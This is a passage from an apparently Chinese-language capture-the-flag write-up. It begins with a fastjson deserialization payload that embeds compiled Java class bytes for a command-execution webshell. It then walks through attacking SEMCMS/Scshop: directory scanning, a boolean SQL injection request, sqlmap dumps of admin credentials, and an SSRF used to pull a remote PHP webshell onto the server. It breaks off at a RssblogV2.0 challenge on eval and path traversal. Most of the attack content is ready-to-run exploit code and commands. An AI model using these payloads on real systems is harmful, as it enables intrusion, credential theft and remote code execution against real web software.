                e.printStackTrace();
            }
            out.write(sb.toString ());
            out.flush();
            out.close();
        }
        public void Exec(String cmd)throws Exception{
            Runtime.getRuntime().exec(cmd);
        }
    }
payload:
    POST /json?cmd=cat /flag HTTP/1.1
    Poc={       
        "name":{
            "@type":"java.lang.Class",
            "val":"\x41\x70\x70\x2e\x45\x78\x65\x63"
        },
            "y":{
             "@type":"com.alibaba.fastjson.JSONObject",
                 "c": {
                       "@type":"\x41\x70\x70\x2e\x45\x78\x65\x63",                  "ClassByte":x'CAFEBABE0000003400950A0021004E0A004F00500A004F00510A005200530700540A000500550A0005005608002B0B005700580A0059005A07005B0A000B005C07005D07005E08005F0A000E00600A000D00610700620A0012005C0700630A0014004E0A000D00640A001400650800660700670B006800690A0019006A0A0014006B0A0019006C0A0019006D0A0019006E07006F0700700100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100094C7061796C6F61643B01000445786563010015284C6A6176612F6C616E672F537472696E673B2956010003636D640100124C6A6176612F6C616E672F537472696E673B01000A457863657074696F6E730700710100104D6574686F64506172616D65746572730100083C636C696E69743E010001650100154C6A6176612F696F2F494F457863657074696F6E3B0100264C6A6176612F696F2F556E737570706F72746564456E636F64696E67457863657074696F6E3B010007726571756573740100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010008726573706F6E73650100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B010009726573486561646572010002696E0100154C6A6176612F696F2F496E70757453747265616D3B01000262720100184C6A6176612F696F2F42756666657265645265616465723B0100046C696E6501000273620100194C6A6176612F6C616E672F537472696E674275696C6465723B0100036F75740100154C6A6176612F696F2F5072696E745772697465723B01000D537461636B4D61705461626C6507007207007307007407007507005B07005D07006207006307006701000A536F7572636546696C6501000C7061796C6F61642E6A6176610C002200230700760C007700780C0079007A07007B0C007C007D0100406F72672F737072696E676672616D65776F726B2F7765622F636F6E746578742F726571756573742F536572766C657452657175657374417474726962757465730C007E007F0C008000810700720C008200830700840C008500860100136A6176612F696F2F494F457863657074696F6E0C008700230100166A6176612F696F2F42756666657265645265616465720100196A6176612F696F2F496E70757453747265616D52656164657201000347424B0C002200880C002200890100246A6176612F696F2F556E737570706F72746564456E636F64696E67457863657074696F6E0100176A6176612F6C616E672F537472696E674275696C6465720C008A008B0C008C008D0100010A0100136A6176612F696F2F5072696E745772697465720700730C008E008F0C002200900C0091008B0C0092002A0C009300230C009400230100077061796C6F61640100106A6176612F6C616E672F4F626A6563740100136A6176612F6C616E672F457863657074696F6E0100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100106A6176612F6C616E672F537472696E670100136A6176612F696F2F496E70757453747265616D0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B01003C6F72672F737072696E676672616D65776F726B2F7765622F636F6E746578742F726571756573742F52657175657374436F6E74657874486F6C646572010014676574526571756573744174747269627574657301003D28294C6F72672F737072696E676672616D65776F726B2F7765622F636F6E746578742F726571756573742F52657175657374417474726962757465733B01000A6765745265717565737401002928294C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B01000B676574526573706F6E736501002A28294C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B01000C676574506172616D65746572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B01000F7072696E74537461636B547261636501002A284C6A6176612F696F2F496E70757453747265616D3B4C6A6176612F6C616E672F537472696E673B2956010013284C6A6176612F696F2F5265616465723B2956010008726561644C696E6501001428294C6A6176612F6C616E672F537472696E673B010006617070656E6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275696C6465723B01000F6765744F757470757453747265616D01002528294C6A617661782F736572766C65742F536572766C65744F757470757453747265616D3B010019284C6A6176612F696F2F4F757470757453747265616D3B2956010008746F537472696E670100057772697465010005666C757368010005636C6F7365002100200021000000000003000100220023000100240000002F00010001000000052AB70001B10000000200250000000600010000000A00260000000C00010000000500270028000000010029002A00030024000000410002000200000009B800022BB6000357B10000000200250000000A0002000000310008003200260000001600020000000900270028000000000009002B002C0001002D000000040001002E002F0000000501002B0000000800300023000100240000025400060009000000BCB80004C00005B600064BB80004C00005B600074C2A1208B9000902004D014EB800022CB60003B6000A4EA7000A3A041904B6000C013A04BB000D59BB000E592D120FB70010B700113A04A7000A3A051905B60013013A05BB001459B700153A061904B60016593A05C70006A70020A7000A3A071907B6000C19061905B600175719061218B6001757A7FFD8013A07BB0019592BB9001A0100B7001B3A07A7000A3A081908B6000C19071906B6001CB6001D1907B6001E1907B6001FB10004001F002A002D000B0037004A004D00120060006B0071000B008E009D00A0000B000300250000007A001E0000000C000A000D0014000E001D000F001F0011002A0014002D0012002F00130034001500370017004A001A004D0018004F00190054001B0057001C0060001F006E002200710020007300210078002300800024008B0026008E0028009D002B00A0002900A2002A00A7002C00B1002D00B6002E00BB002F00260000007A000C002F0005003100320004004F00050031003300050073000500310032000700A20005003100320008000A00B1003400350000001400A7003600370001001D009E0038002C0002001F009C0039003A000300370084003B003C000400570064003D002C00050060005B003E003F0006008E002D004000410007004200000066000BFF002D0004070043070044070045070046000107004706FF00180005070043070044070045070046070048000107004906FD000B07004507004A0D420700470612FF0014000807004307004407004507004607004807004507004A07004B0001070047060001004C00000002004D',
    "$ref":"$.y.c.flag"
                     }         
                 }  
    }
## **ezcms**
扫描目录
    python3 .\dirsearch.py -u http://110.40.192.242:6003/ -e *
得到源码web.zip  
官网下载地址
    https://www.sem-cms.cn/Images/down/Scshop1.5.zip
这个cms是刚出的一个商城管理系统，所以漏洞还是比较多的
代码审计
在/Core/Program/Ant_Rponse.php的提交订阅处存在sql注入  
简单审计即可看到这三个参数是存在sql注入的，当然还有很多其他地方
这里在e_couid参数处进行bool注入  
    POST /Core/Program/Ant_Rponse.php?actions=ClearOrder&id=1 HTTP/1.1
    Host: 110.40.192.242:6003
    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 49
    Origin: http://110.40.192.242:6003
    Connection: close
    Referer: http://110.40.192.242:6003/
    Cookie: PHPSESSID=bekub0gllm8avg8pp8kder0m0i
    e_ml=aaaa%40qq.com&e_couid=6*&e_coucode=SEMCMS
    python3 .\sqlmap.py -r .\1.txt --dbs --technique B
之后跑后台账号密码
    python3 .\sqlmap.py -r .\1.txt  --technique B  -D semcms15 -T sc_user -C user_name,user_admin,user_ps --dump
密码解密为`admin888`/`admin888`
该cms在进行安装的时候会将后台目录进行随机命名，但是在源码中泄露了后台地址  
`CxWsbN_AR4`
登录后台  
之后得想办法获取服务器权限  
在后台目录中有一个`/CxWsbN_AR4/Ant_Curl.php`文件，经过审计该有一个获取文件的功能
查看getfile函数  
一个ssrf，并且会将我们的文件进行保存  
构造payload
    110.40.192.242:6003/CxWsbN_AR4/Ant_Curl.php?url=http://PI:EMAIL/111.php
这里需要绕过一个检测  
之后访问
    http://110.40.192.242:6003/Soft/Zip/111.php
即可  
## **RssblogV2.0**
### 出题思路
出题思路来自Rsshub之前披露的漏洞风险通报
没有exp，简单跟了一下，大概问题就是爬取目标地址时，使用eval或Function来执行script字段，并且在测试过程中还意外发现能通过目录穿越来控制内容。即它本来是爬去单个页面，但通过路径穿越使得攻击面从单个网页扩大到了整个网站
然后简单按照这个思路出了rssblog，原本在陇原战疫就出了一个rssblog，但那道题由纯node实现，node解析路由是无法路径穿越的，当时时间紧迫就来不及改了，遂放了半成品上去hhh
后面自己又去github找了个php的简易博客魔改用来把文章相关功能分离开，就能路径穿越了
### 题解